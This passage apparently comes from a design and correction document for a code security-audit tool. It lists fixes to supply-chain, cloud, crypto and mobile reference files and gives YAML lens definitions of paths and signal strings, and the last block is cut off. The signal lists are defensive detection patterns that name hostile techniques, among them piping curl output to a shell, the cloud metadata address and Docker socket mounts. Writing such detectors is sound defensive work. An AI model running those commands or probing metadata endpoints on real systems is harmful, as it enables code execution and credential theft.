**37. `references/cicd-and-supply-chain.md` â€” three controls that do not do what the file says.**
- Wrong: `Defense: 2FA on registry accounts, package signing, install with `--ignore-scripts`` (on the ua-parser-js / coa / rc account-takeover entry, whose dates should also read 2021, not "2021-2022"). Correction: package signing is no defense against maintainer ATO â€” an attacker publishing through the compromised account produces a validly signed release with valid provenance. Keep 2FA/hardware keys and `--ignore-scripts`; replace signing with a quarantine window before ingesting new versions (Renovate `minimumReleaseAge`, Dependabot cooldown, npm `--before`), lockfile + integrity-hash pinning, install-time egress restriction, and post-install tarball diffing.
- Wrong: `- Audit by checking install commands against actual registry packages`. Correction: logically inverted for typosquatting â€” a typosquat *is* a real package, so an existence check passes. Existence checks refute only hallucinated names (the slopsquatting half). Compare against the intended package's identity: repo URL, maintainer/org, first-publish date, version count, download volume, one-edit-distance proximity to a far more popular name; then diff the manifest against an allowlist or the committed lockfile.
- Wrong: `- npm/PyPI publishes from CI without provenance attestation (npm provenance, PyPI Trusted Publishers)`. Correction: conflates authentication with provenance. Trusted Publishers is OIDC publishing that removes long-lived tokens and emits no provenance by itself; PyPI provenance is PEP 740 attestations (GA Nov 2024). Split the checks â€” auth: Trusted Publishers/OIDC, flag long-lived `PYPI_API_TOKEN`/`NPM_TOKEN`; provenance: `npm publish --provenance` and `pypa/gh-action-pypi-publish` with `attestations: true`, verified via `npm audit signatures` / `gh attestation verify`.
- Wrong: `- `.gitattributes` and `.gitignore` covering `.env`, `*.pem`, `*.key`, etc.`. Correction: `.gitattributes` has no role in excluding files from commits (it controls eol normalization, diff/merge drivers, filters, and `export-ignore` for archives). Only `.gitignore`/`.git/info/exclude`/`core.excludesFile` affect staging. Drop it or repurpose precisely, and add the check that matters: `.gitignore` does nothing about already-committed secrets, so audit history with `git log --all --full-history -- '*.pem' '.env'` and gitleaks/trufflehog over full history.

**38. `references/cicd-and-supply-chain.md` and `references/cloud-and-iac.md` line 157 â€” "Notary".**
Wrong: `Container images pushed without Cosign/Notary signatures` and `No image signature verification (Cosign, Notary)`
Correction: "Notary" here means Notary v1 / Docker Content Trust, legacy and effectively unmaintained. The current mechanisms are Sigstore Cosign and the Notary Project's **Notation** (Notary v2, OCI 1.1 referrers), enforced via Kyverno/Gatekeeper, AWS Signer/ECR, or GCP Binary Authorization â€” and paired with SLSA provenance verification, not signature-only checks. Identical wording in both files; fix together and assign ownership per the overlap register.

**39. `references/cloud-and-iac.md` â€” wrong products named as the mitigating control.**
Wrong: `No automated unused permission detection (AWS Access Analyzer, Azure PIM, GCP Recommender)`
Correction: Microsoft Entra PIM is just-in-time elevation with eligibility/approval â€” it does not detect unused permissions, and leaving it here causes auditors to accept the wrong control as a mitigation. Use "IAM Access Analyzer unused access findings (unused roles, keys, permissions)", "Microsoft Entra Permissions Management (CIEM), with Entra ID access reviews as governance and PIM only for JIT", and "GCP IAM Recommender / Policy Analyzer". The AWS product name is IAM Access Analyzer. While in this file: "Azure AD"/"AAD" was renamed **Microsoft Entra ID** in July 2023 and the stale name recurs across the Azure sections (Conditional Access, Managed Identity, storage-key discussion), and "Azure AD Pod Identity" is retired in favour of Entra Workload ID. Also rename GCP "primitive roles" to **basic roles**.

**40. `references/cloud-and-iac.md` â€” the stated leak mechanism for env-var secrets is false.**
Wrong: `` `secrets` mounted as env vars rather than files (env vars leak via `kubectl describe` and crash logs) ``
Correction: `kubectl describe pod` renders a `valueFrom.secretKeyRef` as `<set to the key 'x' in secret 'y'>` â€” the value is not shown. Only a literal `value:` is displayed, which is a different finding (secret hardcoded in a manifest). Give the accurate reasons: readable via `/proc/<pid>/environ` by anything in the container, inherited by every child process, captured in core dumps and by telemetry agents that serialize the environment, printed by `kubectl exec -- env`, and â€” the real one â€” not rotatable without a pod restart, whereas a projected volume updates in place. Keep the `docker inspect` half of the earlier claim; that one genuinely shows values.

**41. `references/cloud-and-iac.md` â€” the KMS check as written fires on essentially every key.**
Wrong: `KMS key policies that grant `kms:*` to the root user of "any account" via misconfiguration`
Correction: `"Principal": {"AWS": "arn:aws:iam::123456789012:root"}` with `kms:*` is AWS's *default* key policy for the key's own account and does not designate the root user â€” it delegates authorization to that account's IAM policies. Split into the two real findings: (1) `Principal: "*"` or an org-wide grant with no `aws:PrincipalOrgID`; (2) a `root` principal belonging to a *different* account, which delegates the key to that entire foreign account. Add the scoping conditions that matter (`kms:ViaService`, `kms:CallerAccount`) and grants created via `CreateGrant`, which bypass a reviewer's reading of the policy.

**42. `references/crypto-deep-dive.md` line 85 and `references/mobile.md` â€” a citation to an edition that does not exist.**
Wrong: `- **Password hashing**: bcrypt, scrypt, argon2id with proper parameters. Per OWASP 2023:` and `PBKDF2 with low iteration counts (<600k for SHA-256 per OWASP 2023 guidance)`
Correction: the OWASP Password Storage Cheat Sheet is a continuously updated living document with no 2023 edition, so the citation cannot be verified or diffed. The **parameter values are all correct** as of the current revision â€” verified independently: Argon2id m=19 MiB/t=2/p=1, bcrypt cost â‰¥10, scrypt N=2Â¹â·/r=8/p=1, PBKDF2-HMAC-SHA256 600,000 â€” so change only the label: drop the year and pin the source by URL plus retrieval date, and note RFC 9106's divergent recommendation (2 GiB/t=1/p=4 first choice, 64 MiB second) so an auditor is not blindsided when a team cites the RFC. In `mobile.md`, additionally note that 600k is a *server-side password-verification* figure; applying it to an on-device KDF is a misapplication â€” the mobile answer is a hardware-backed key in Keystore/Secure Enclave, with argon2id if a KDF is unavoidable, deferring parameters to the crypto lens.

---

### Corrections that change routing

These are the items whose fix must propagate into lens frontmatter (`frameworks`, `activates_on.paths`, `activates_on.signals`) or into `lenses/_topics.md`. Everything else above is body text only.

- **Delete `SANS Top 25` from the framework identifier set (item 1).** It appears in `SKILL.md` line 71 and would otherwise be inherited into `frameworks` on every lens that claims a CWE lineage. Frameworks are unversioned identifiers, so the entry becomes exactly one: `cwe-top-25`.
- **`frameworks` for web-and-api must pin ASVS or drop the claim (items 2, and the ASVS finding).** `references/web-and-api.md` line 3 says "ASVS L1/L2 patterns", but ASVS 5.0.0 (30 May 2025) renumbered every chapter and requirement, and not one requirement in the body is traceable to an ASVS ID. Either declare `owasp-asvs` and cite real 5.0 requirement IDs in the header/session/cookie sections, or remove the claim â€” do not ship an unsupported framework identifier auditors will quote to clients.
- **Lock `A09: Security Logging and Alerting Failures` as the routing key.** The framework fact-check overrules the web-and-api inventory here; the name is official and correct. Add it to the CI-checked list of literal category strings so no future pass "corrects" it and breaks name-based routing.
- **`llm-and-ai` `frameworks` is a version behind its own subject matter.** It cites only the LLM Applications Top 10 2025 (correct and current) while covering agents with tools. Add `owasp-agentic-top-10` â€” OWASP GenAI published *Top 10 for Agentic Applications 2026* on 9 Dec 2025 â€” plus `nist-ai-600-1`, `mitre-atlas`, and `nist-ssdf-800-218a` (GenAI SSDF Community Profile, final 26 Jul 2024). This is the most defensible framework addition in the whole set.
- **`llm-and-ai` `activates_on.paths` and `signals` must cover MCP.** The file has zero MCP coverage, so a 2026 repo greps `.mcp.json`, `FastMCP`, `@modelcontextprotocol/sdk` and gets nothing. Add those paths/signals, and add `trust_remote_code=True`, `weights_only=False`, `allow_dangerous_code=True` as signals in place of the dead `PythonREPLTool` / `torch.load` patterns.
- **`llm-and-ai` topic slug for embedding inversion moves category.** `Embedding inversion attacks â€” embeddings of sensitive text can sometimes be reversed back to approximate the source` currently sits under `### LLM04: Data and Model Poisoning`, which is integrity; embedding inversion is disclosure (LLM08 Vector and Embedding Weaknesses, cross-referenced to LLM02). Because findings inherit the section's category ID, and the file already re-lists it correctly under LLM08, one auditor can report it twice under two IDs. Remove from LLM04, keep the single occurrence under LLM08, and register the slug once in `_topics.md`.
- **`mobile` `activates_on` currently promises coverage the body does not have.** `Load this for React Native, Expo, native iOS (Swift/Obj-C), native Android (Kotlin/Java), Flutter, or any mobile-targeted code.` â€” there is not one Flutter item in the file, and native gets one Keychain line plus EncryptedSharedPreferences. Either narrow `activates_on.paths` to React Native/Expo plus the manifest/plist/IPC surface actually covered, or add the Flutter block (`pubspec.yaml`/`pubspec.lock`, `*.dart`, `flutter_secure_storage` + `IOSOptions.accessibility`, `--obfuscate`/`--split-debug-info`, `badCertificateCallback`, platform-channel validation) and the native block (`addJavascriptInterface`, `PendingIntent.FLAG_IMMUTABLE`, Keychain `kSecAttrAccessGroup`, `NSFileProtection`). Activating on `*.dart` today produces a clean report on a vulnerable app.
- **`cicd-and-supply-chain` `activates_on.signals` cannot use the `pwn-request` string (item 6),** and `activates_on.paths` must name `pip.conf`/`pip.ini` plus `uv.toml` and `pyproject.toml` index blocks rather than the nonexistent `.pip.conf`. The pwn-request signal becomes structural: privileged trigger + head-sha checkout + secrets/write-token.
- **`cloud-and-iac` signals keyed on removed platform features will never activate.** Replace `PodSecurityPolicy` with Pod Security Admission labels and admission-policy manifests, demote `/var/run/docker.sock` below `/run/containerd/containerd.sock` and `/var/run/crio/crio.sock` (dockershim removed in 1.24), fix `serviceaccounts/tokenrequest` â†’ `serviceaccounts/token`, and replace `Azure AD`/`AAD` keywords with `Entra` â€” a config search for the old name matches nothing in current code.
- **`cloud-and-iac` and `cicd-and-supply-chain` both claim signature verification via a retired tool (item 38).** The framework/tool identifiers become Sigstore Cosign and Notary Project Notation in both lenses, and ownership of the container-signing topic slug must be assigned to exactly one of them in `_topics.md`.
- **`privacy-and-compliance` `frameworks` is missing the instrument that governs half its content (item 20).** Add `eprivacy-directive` (2002/58/EC Art 5(3), Art 13) and `edpb-guidelines-02-2023`; keep GDPR for consent quality and lawful basis. Also add `pci-dss` explicitly at v4.0.1 as the only active version, with Reqs 6.4.3 and 11.6.1 (payment-page script inventory/integrity and header change detection â€” mandatory since 31 March 2025) as the code-visible anchors this lens gestures at but never names.
- **`hipaa-and-phi` scope narrows and one framework is added.** The Â§164.312 technical safeguards apply to **ePHI only** (item 13's sibling correction), so the lens must not activate on paper/fax/oral-PHI-only surfaces â€” state that in `## Scope` under "does not own", routing those to Privacy Rule / Â§164.310. Add `42-cfr-part-2` to `frameworks`: its February 2024 final rule reached compliance on 16 Feb 2026 and imposes consent and redisclosure-notice duties stricter than HIPAA â€” material for any behavioural-health codebase, which is exactly what this lens activates on.
- **`threat-modeling` claims a framework it never uses.** `SKILL.md` advertises MITRE ATT&CK as in scope, and the `### Persistence / lateral movement (post-compromise)` section describes ATT&CK tactics in prose with no technique IDs. Either cite technique IDs so the output can be handed to a detection/IR team (the only audience for that section) or drop `mitre-attack` from `frameworks`.
- **`cloud-and-iac` keeps `cis-benchmarks` unversioned â€” deliberately.** The fact-check confirms this is the one framework where omitting a version is correct, since CIS ships per-technology benchmarks monthly and no global version exists. Do not let a version-pinning pass add one; instead add one body clause instructing auditors to name the specific benchmark and version they checked (e.g. "CIS AWS Foundations v7.0.0, section 2.1.1") and to state that Level 2 items are hardening, not vulnerabilities.

## 2–3. Overlap resolution and frontmatter — SUPERSEDED

**This section is structurally incomplete and is not the source of truth.** The writer producing the overlap resolution table, the topic registry and the thirteen frontmatter blocks exceeded its output limit and continued in a fresh turn, so only the tail of its work was returned. Lost: the section headers, the complete overlap table, the head of the registry, and the frontmatter for `web-and-api` and `crypto-and-key-management`.

**Use `2026-07-26-recon-punch-list-repair.md` instead.** It carries the complete assignment plus an adversarial invariant verification. Per the design spec, lens frontmatter is the single source of truth and `_topics.md` is generated from it — neither this section nor the repair companion is authoritative once Phase A0 produces the normalised artifact.

What follows below, beginning mid-mapping, is the surviving fragment. It is retained only as provenance. The first block is the tail of the `crypto-and-key-management` frontmatter whose head was lost; the verifier confirmed it is byte-identical to the tail of the independently reconstructed block, which is what corroborates that reconstruction.

<!-- BEGIN MALFORMED FRAGMENT — this block only; the well-formed blocks resume after the END marker below -->

**Scope of this marker:** only the single partial block immediately following is malformed — it is the tail of the `crypto-and-key-management` frontmatter whose head was lost to output truncation. Everything after the END marker is well-formed and was used as a source. An earlier revision of this file wrapped all 1,250 lines in this warning, which wrongly labelled eleven valid blocks as unusable.

-external-credentials: salesforce-platform
  connected-app-configuration: salesforce-platform
  phi-encryption-sufficiency: hipaa-and-phi
  breach-notification-exposure: hipaa-and-phi
  pseudonymisation-and-reidentification-risk: privacy-and-data-protection
  pci-scope-and-cardholder-data: privacy-and-data-protection
  retention-lawfulness-and-deletion-completeness: privacy-and-data-protection
  stride-decomposition: threat-modeling
  trust-boundary-inventory: threat-modeling
frameworks:
  - owasp-password-storage-cheat-sheet
  - rfc-6979
  - rfc-5869
  - rfc-8017
  - rfc-9106
  - rfc-8996
  - rfc-9700
  - rfc-7636
  - nist-sp-800-38d
  - nist-sp-800-56b
  - cwe
severity_floor: low
---
```

<!-- END MALFORMED FRAGMENT -->

**The blocks below this line were well-formed and complete.** They were the source Task 9 copied the eleven surviving lens frontmatter blocks from, and the six normalisation transforms were applied on the way. They are retained as provenance and are **superseded by the committed lens files** under `skills/last-aperture/lenses/`, which are now the single source of truth. Read them to understand where a value came from; never edit them expecting an effect.

```yaml
---
name: cloud-and-iac
title: Cloud and infrastructure as code
cross_cutting: false
activates_on:
  paths:
    - '**/*.tf'
    - '**/*.tfvars'
    - '**/*.tf.json'
    - '**/.terraform.lock.hcl'
    - '**/terragrunt.hcl'
    - '**/*.tfstate'
    - '**/*.tfstate.backup'
    - '**/Pulumi.yaml'
    - '**/Pulumi.*.yaml'
    - '**/cdk.json'
    - '**/cdk.context.json'
    - '**/cdk.out/**'
    - '**/template.y*ml'
    - '**/*.cfn.y*ml'
    - '**/*.cfn.json'
    - '**/cloudformation/**'
    - '**/samconfig.toml'
    - '**/serverless.y*ml'
    - '**/*.bicep'
    - '**/*.bicepparam'
    - '**/azuredeploy.json'
    - '**/arm/**/*.json'
    - '**/Dockerfile'
    - '**/Dockerfile.*'
    - '**/*.dockerfile'
    - '**/.dockerignore'
    - '**/docker-compose*.y*ml'
    - '**/k8s/**/*.y*ml'
    - '**/kubernetes/**/*.y*ml'
    - '**/manifests/**/*.y*ml'
    - '**/kustomization.y*ml'
    - '**/overlays/**/*.y*ml'
    - '**/base/**/*.y*ml'
    - '**/Chart.yaml'
    - '**/Chart.lock'
    - '**/values*.y*ml'
    - '**/templates/*.y*ml'
    - '**/skaffold.y*ml'
    - '**/eksctl*.y*ml'
    - '**/*.rego'
    - '**/policy/**/*.y*ml'
    - '**/.checkov.y*ml'
    - '**/.tflint.hcl'
    - '**/app.yaml'
    - '**/cloud-init*.y*ml'
    - '**/user-data*.sh'
    - '**/firestore.rules'          # added with baas-security-rules, moved here from mobile
    - '**/storage.rules'            # added, same
    - '**/database.rules.json'      # added, same
    - '**/firebase.json'            # added, same
  signals:
    - 'provider "aws"'
    - 'provider "azurerm"'
    - 'provider "google"'
    - 'terraform { backend "s3"'
    - 'backend "azurerm"'
    - 'backend "gcs"'
    - 'data "aws_iam_policy_document"'
    - 'aws_iam_role assume_role_policy'
    - 'aws_s3_bucket_public_access_block'
    - 'aws_security_group ingress'
    - 'cidr_blocks = ["0.0.0.0/0"]'
    - 'publicly_accessible = true'
    - 'metadata_options { http_tokens'
    - 'lifecycle { prevent_destroy'
    - 'use_lockfile'
    - 'AWSTemplateFormatVersion'
    - 'Transform: AWS::Serverless-2016-10-31'
    - 'NoEcho'
    - '{{resolve:secretsmanager:'
    - 'aws-cdk-lib'
    - 'constructs'
    - '@pulumi/aws'
    - '@pulumi/kubernetes'
    - 'pulumi_aws'
    - 'boto3'
    - 'botocore'
    - '@aws-sdk/client-s3'
    - '@aws-sdk/client-sts'
    - 'azure-identity'
    - 'azure-mgmt-resource'
    - '@azure/identity'
    - '@azure/arm-'
    - 'google-cloud-storage'
    - 'google-auth'
    - '@google-cloud/'
    - 'kubernetes (python client)'
    - '@kubernetes/client-node'
    - 'k8s.io/client-go'
    - 'apiVersion: rbac.authorization.k8s.io'
    - 'kind: ClusterRoleBinding'
    - 'kind: NetworkPolicy'
    - 'kind: PodSecurityPolicy'
    - 'securityContext:'
    - 'privileged: true'
    - 'hostNetwork: true'
    - 'hostPID: true'
    - 'hostPath:'
    - 'automountServiceAccountToken'
    - 'serviceAccountName:'
    - 'imagePullPolicy:'
    - 'type: LoadBalancer'
    - 'pod-security.kubernetes.io/enforce'
    - 'eks.amazonaws.com/role-arn'
    - 'iam.gke.io/gcp-service-account'
    - 'azure.workload.identity/use'
    - 'token.actions.githubusercontent.com'
    - 'FROM ...:latest'
    - 'USER root'
    - 'RUN curl ... | sh'
    - 'COPY .env'
    - '--mount=type=secret'
    - '169.254.169.254'
    - 'metadata.google.internal'
    - 'allUsers'
    - 'allAuthenticatedUsers'
    - '--allow-unauthenticated'
    - 'AuthType: NONE'
    - 'authLevel: anonymous'
    - 'checkov'
    - 'tfsec'
    - 'terrascan'
    - 'trivy'
    - 'grype'
    - 'kubescape'
    - 'conftest'
    - 'kyverno'
    - 'gatekeeper'
    - 'helm'
    - 'allow read, write: if true'   # added with baas-security-rules
owns:
  - iam-policy-and-privilege-scope
  - cloud-oidc-trust-policy
  - network-exposure-and-segmentation
  - object-storage-exposure
  - imds-hardening
  - encryption-at-rest-configuration
  - kms-key-lifecycle-and-policy
  - resource-tls-enforcement-flags
  - kubernetes-workload-hardening
  - kubernetes-rbac-and-admission
  - dockerfile-and-image-content
  - image-cve-exposure
  - deploy-time-signature-enforcement
  - serverless-function-exposure
  - terraform-state-protection
  - managed-secret-service-configuration
  - control-plane-audit-logging
  - backup-and-replica-configuration
  - data-region-inventory
  - baas-security-rules
  - helm-and-manifest-source-pinning
defers:
  injection-sql-nosql-orm: web-and-api
  xss-and-output-encoding: web-and-api
  authz-object-level: web-and-api
  session-and-cookie-management: web-and-api
  security-headers-and-csp: web-and-api
  ssrf-application-path: web-and-api
  workflow-trigger-and-script-injection: cicd-and-supply-chain
  runner-and-build-environment-trust: cicd-and-supply-chain
  ci-secret-and-token-handling: cicd-and-supply-chain
  ci-oidc-workflow-configuration: cicd-and-supply-chain
  action-and-workflow-ref-pinning: cicd-and-supply-chain
  dependency-pinning-and-lockfiles: cicd-and-supply-chain
  artifact-signing-and-provenance-emission: cicd-and-supply-chain
  sbom-generation-and-attachment: cicd-and-supply-chain
  pipeline-scanner-gating: cicd-and-supply-chain
  privileged-deploy-gate: cicd-and-supply-chain
  tls-and-certificate-validation: crypto-and-key-management
  jwt-jws-and-jwks-verification: crypto-and-key-management
  password-hashing-and-kdf-parameters: crypto-and-key-management
  symmetric-encryption-and-nonce-handling: crypto-and-key-management
  rag-retrieval-authorization: llm-and-ai
  mobile-local-data-storage: mobile-app-security
  platform-keystore-key-custody: mobile-app-security
  apex-sharing-declaration: salesforce-platform
  phi-classification: hipaa-and-phi
  phi-severity-uplift: hipaa-and-phi
  phi-access-audit-controls: hipaa-and-phi
  hipaa-documentation-retention: hipaa-and-phi
  cross-border-transfer-route: privacy-and-data-protection
  retention-lawfulness-and-deletion-completeness: privacy-and-data-protection
  personal-data-severity-uplift: privacy-and-data-protection
  pci-scope-and-cardholder-data: privacy-and-data-protection
  architecture-trust-design-gaps: threat-modeling
  pivot-feasibility: threat-modeling
frameworks:
  - cis-benchmarks
  - kubernetes-pod-security-standards
  - kubernetes-rbac
  - cwe
severity_floor: low
---
```

```yaml
---
name: cicd-and-supply-chain
title: CI/CD pipeline and software supply chain
cross_cutting: false
activates_on:
  paths:
    - '.github/workflows/**/*.y*ml'
    - '.github/actions/**/action.y*ml'
    - '**/action.y*ml'
    - '.github/dependabot.y*ml'
    - '.github/CODEOWNERS'
    - '.gitlab-ci.yml'
    - '.gitlab/**/*.y*ml'
    - '**/Jenkinsfile*'
    - '.circleci/config.yml'
    - 'azure-pipelines*.y*ml'
    - 'bitbucket-pipelines.yml'
    - '.buildkite/**'
    - '.drone.yml'
    - 'cloudbuild.y*ml'
    - 'buildspec*.y*ml'
    - '.travis.yml'
    - 'Makefile'
    - 'Taskfile.y*ml'
    - 'scripts/**/*.sh'
    - 'ci/**'
    - '**/package.json'
    - '**/package-lock.json'
    - '**/pnpm-lock.yaml'
    - '**/yarn.lock'
    - '**/bun.lock*'
    - '**/.npmrc'
    - '**/.yarnrc.y*ml'
    - 'requirements*.txt'
    - 'pyproject.toml'
    - 'poetry.lock'
    - 'uv.lock'
    - 'Pipfile.lock'
    - 'pip.conf'
    - 'pip.ini'
    - 'go.mod'
    - 'go.sum'
    - 'Cargo.lock'
    - 'Gemfile.lock'
    - 'composer.lock'
    - 'pom.xml'
    - '**/settings.xml'
    - 'build.gradle*'
    - 'gradle/verification-metadata.xml'
    - '**/packages.lock.json'
    - '.pre-commit-config.yaml'
    - 'renovate.json*'
    - '.releaserc*'
    - '.goreleaser.y*ml'
    - 'SECURITY.md'
    - '**/*.spdx.json'
    - '**/*.cdx.json'
    - 'fastlane/Fastfile'
    - 'eas.json'
  signals:
    - 'on: pull_request_target'
    - 'on: workflow_run'
    - 'on: issue_comment'
    - 'runs-on: self-hosted'
    - '${{ github.event.'
    - '${{ github.head_ref'
    - '$GITHUB_ENV'
    - '$GITHUB_OUTPUT'
    - 'uses: actions/checkout'
    - 'persist-credentials'
    - 'uses: actions/cache'
    - 'uses: actions/upload-artifact'
    - 'secrets.GITHUB_TOKEN'
    - 'id-token: write'
    - 'permissions:'
    - 'aws-actions/configure-aws-credentials'
    - 'google-github-actions/auth'
    - 'azure/login'
    - 'docker/build-push-action'
    - 'docker/login-action'
    - 'sigstore/cosign-installer'
    - 'slsa-framework/slsa-github-generator'
    - 'pypa/gh-action-pypi-publish'
    - 'npm publish --provenance'
    - 'NPM_TOKEN'
    - 'PYPI_API_TOKEN'
    - 'NODE_AUTH_TOKEN'
    - 'npm ci'
    - '--ignore-scripts'
    - '--extra-index-url'
    - '--require-hashes'
    - '--only-binary'
    - 'curl -fsSL | sh'
    - '/var/run/docker.sock'
    - 'docker:dind'
    - '@Library('
    - 'pipeline {'
    - 'agent any'
    - 'CI_JOB_TOKEN'
    - 'CI_PIPELINE_SOURCE'
    - 'include: remote:'
    - 'masked: true'
    - 'cosign verify'
    - 'gh attestation verify'
    - 'syft / trivy / grype'
    - 'gitleaks / trufflehog'
    - 'zizmor / actionlint / poutine'
    - 'cargo build --locked'
    - 'GOFLAGS=-mod=mod'
    - 'set -x'
owns:
  - workflow-trigger-and-script-injection
  - runner-and-build-environment-trust
  - ci-secret-and-token-handling
  - ci-oidc-workflow-configuration
  - action-and-workflow-ref-pinning
  - dependency-pinning-and-lockfiles
  - dependency-confusion-and-registry-config
  - package-name-squatting
  - install-and-lifecycle-scripts
  - package-dependency-cves
  - dependency-eol-and-abandonment
  - artifact-signing-and-provenance-emission
  - sbom-generation-and-attachment
  - pipeline-scanner-gating
  - privileged-deploy-gate
  - unauthenticated-build-trigger
defers:
  webhook-handler-integrity: web-and-api
  third-party-script-integrity-sri: web-and-api
  injection-sql-nosql-orm: web-and-api
  authz-object-level: web-and-api
  iam-policy-and-privilege-scope: cloud-and-iac
  cloud-oidc-trust-policy: cloud-and-iac
  kubernetes-workload-hardening: cloud-and-iac
  dockerfile-and-image-content: cloud-and-iac
  image-cve-exposure: cloud-and-iac
  deploy-time-signature-enforcement: cloud-and-iac
  terraform-state-protection: cloud-and-iac
  encryption-at-rest-configuration: cloud-and-iac
  hmac-and-constant-time-comparison: crypto-and-key-management
  asymmetric-scheme-pitfalls: crypto-and-key-management
  hardcoded-credentials-and-key-material: crypto-and-key-management
  model-artifact-provenance: llm-and-ai
  mcp-server-trust: llm-and-ai
  ota-update-integrity: mobile-app-security
  native-module-provenance: mobile-app-security
  secrets-in-mobile-binary: mobile-app-security
  sfdx-deploy-exposure: salesforce-platform
  baa-coverage-determination: hipaa-and-phi
  phi-in-lower-environments: hipaa-and-phi
  processor-contracts-and-dpa: privacy-and-data-protection
  payment-page-script-authorisation: privacy-and-data-protection
  trust-boundary-inventory: threat-modeling
  attacker-profile-model: threat-modeling
frameworks:
  - nist-ssdf
  - slsa
  - cyclonedx
  - spdx
  - owasp-top-10
  - cwe
severity_floor: low
---
```

```yaml
---
name: mobile-app-security
title: Mobile application security
cross_cutting: false
activates_on:
  paths:
    - '**/app.json'
    - '**/app.config.{js,ts,cjs,mjs}'
    - '**/eas.json'
    - '**/metro.config.js'
    - '**/react-native.config.js'
    - '**/android/app/src/**/AndroidManifest.xml'
    # CORRECTED 2026-07-27: never write {,.ext} — ripgrep's globset silently drops
    # the EMPTY branch, so 'build.gradle{,.kts}' behaves as 'build.gradle.kts' and
    # never matches the more common Groovy 'build.gradle'. Measured on ripgrep
    # 14.1.1. It does not match zero files, which is the trap: it returns hits on
    # Kotlin-DSL repos so it looks correct while being blind to the majority case.
    - '**/android/app/build.gradle'
    - '**/android/app/build.gradle.kts'
    - '**/android/app/proguard-rules.pro'
    - '**/android/app/src/**/res/xml/network_security_config.xml'
    - '**/ios/**/Info.plist'
    - '**/ios/**/*.entitlements'
    - '**/ios/Podfile'          # CORRECTED 2026-07-27: see the {,.ext} note above
    - '**/ios/Podfile.lock'
    - '**/*.swift'
    - '**/*.{m,mm,h}'
    - '**/*.{kt,kts,java}'
    - '**/*.dart'
    - '**/pubspec.yaml'
    - '**/google-services.json'
    - '**/GoogleService-Info.plist'
    - '**/fastlane/**'
    - '**/.well-known/apple-app-site-association'
    - '**/.well-known/assetlinks.json'
    - '**/PrivacyInfo.xcprivacy'
    - '**/src/**/*.{ts,tsx,js,jsx}'
  signals:
    - 'react-native'
    - 'react-native-web'
    - 'expo'
    - 'expo-secure-store'
    - 'expo-updates'
    - 'expo-auth-session'
    - 'expo-dev-client'
    - '@react-native-async-storage/async-storage'
    - 'react-native-webview'
    - 'react-native-keychain'
    - 'react-native-encrypted-storage'
    - 'react-native-sensitive-info'
    - 'react-native-mmkv'
    - 'react-native-purchases'
    - '@react-native-firebase/app'
    - 'react-native-code-push'
    - 'flutter_secure_storage'
    - 'dio'
    - 'androidx.security:security-crypto'
    - 'com.google.crypto.tink'
    - 'AsyncStorage.setItem'
    - 'SecureStore.setItemAsync'
    - 'Linking.addEventListener'
    - 'Linking.openURL'
    - 'originWhitelist'
    - 'injectedJavaScript'
    - 'injectedJavaScriptBeforeContentLoaded'
    - 'window.ReactNativeWebView.postMessage'
    - 'addJavascriptInterface'
    - '@JavascriptInterface'
    - 'setJavaScriptEnabled'
    - 'setAllowUniversalAccessFromFileURLs'
    - 'mixedContentMode'
    - 'WKUserContentController'
    - 'add(scriptMessageHandler'
    - 'kSecAttrAccessible'
    - 'SecItemAdd'
    - 'UserDefaults.standard'
    - 'NSUserDefaults'
    - 'getSharedPreferences'
    - 'EncryptedSharedPreferences'
    - 'MasterKey.Builder'
    - 'KeyGenParameterSpec'
    - 'setUserAuthenticationRequired'
    - 'BiometricPrompt'
    - 'LocalAuthentication'
    - 'LAContext().evaluatePolicy'
    - 'UIPasteboard.general'
    - 'ClipboardManager'
    - 'NSAppTransportSecurity'
    - 'NSAllowsArbitraryLoads'
    - 'android:usesCleartextTraffic'
    - 'android:allowBackup'
    - 'android:dataExtractionRules'
    - 'android:debuggable'
    - 'android:exported'
    - 'android:autoVerify'
    - 'PendingIntent.FLAG_MUTABLE'
    - 'CertificatePinner'
    - 'ServerTrustManager'
    - 'badCertificateCallback'
    - 'TrustManager'
    - 'HostnameVerifier'
    - '__DEV__'
    - 'hermesEnabled'
    - 'newArchEnabled'
    - 'expo.updates.codeSigningCertificate'
    - 'UIApplicationOpenURLOptionsSourceApplicationKey'
owns:
  - mobile-local-data-storage
  - platform-keystore-key-custody
  - secrets-in-mobile-binary
  - mobile-network-config-artifacts
  - certificate-pinning-implementation
  - native-app-oauth-integration
  - deep-link-and-ipc-surface
  - webview-bridge-trust
  - mobile-build-and-runtime-flags
  - mobile-ui-and-notification-leakage
  - in-app-consent-mechanisms
  - privacy-manifest-and-store-declarations
  - ota-update-integrity
  - native-module-provenance
defers:
  authz-object-level: web-and-api
  authz-property-level: web-and-api
  authz-function-level: web-and-api
  rate-limiting-and-request-quotas: web-and-api
  xss-and-output-encoding: web-and-api
  open-redirect: web-and-api
  symmetric-encryption-and-nonce-handling: crypto-and-key-management
  password-hashing-and-kdf-parameters: crypto-and-key-management
  tls-and-certificate-validation: crypto-and-key-management
  oauth-oidc-flow-correctness: crypto-and-key-management
  asymmetric-scheme-pitfalls: crypto-and-key-management
  jwt-jws-and-jwks-verification: crypto-and-key-management
  dependency-pinning-and-lockfiles: cicd-and-supply-chain
  ci-secret-and-token-handling: cicd-and-supply-chain
  package-dependency-cves: cicd-and-supply-chain
  sbom-generation-and-attachment: cicd-and-supply-chain
  baas-security-rules: cloud-and-iac
  iam-policy-and-privilege-scope: cloud-and-iac
  object-storage-exposure: cloud-and-iac
  prompt-injection: llm-and-ai
  model-artifact-provenance: llm-and-ai
  apex-sharing-declaration: salesforce-platform
  phi-classification: hipaa-and-phi
  phi-severity-uplift: hipaa-and-phi
  lawful-basis-and-consent-capture: privacy-and-data-protection
  processor-contracts-and-dpa: privacy-and-data-protection
  childrens-data-and-age-assurance: privacy-and-data-protection
  retention-lawfulness-and-deletion-completeness: privacy-and-data-protection
  attacker-profile-model: threat-modeling
  trust-boundary-inventory: threat-modeling
frameworks:
  - owasp-mobile-top-10
  - owasp-masvs
  - owasp-mastg
  - cwe
severity_floor: low
---
```

```yaml
---
name: llm-and-ai
title: LLM and AI application security
cross_cutting: false
activates_on:
  paths:
    - '**/{llm,ai,genai,agents,agent,tools,prompts,rag,retrieval,embeddings,chains,graphs}/**'
    - '**/*{prompt,Prompt}*.{py,ts,tsx,js,mjs,rb,go,java,kt,cs,md}'
    - '**/*{agent,Agent,rag,Rag,retriev,embed,Embed,vectorstore,rerank}*.{py,ts,tsx,js,mjs,rb,go,java,kt,cs}'
    - '**/system_prompt*'
    - '**/*.{prompt,jinja,jinja2,j2}'
    - '**/.mcp.json'
    - '**/mcp*.json'
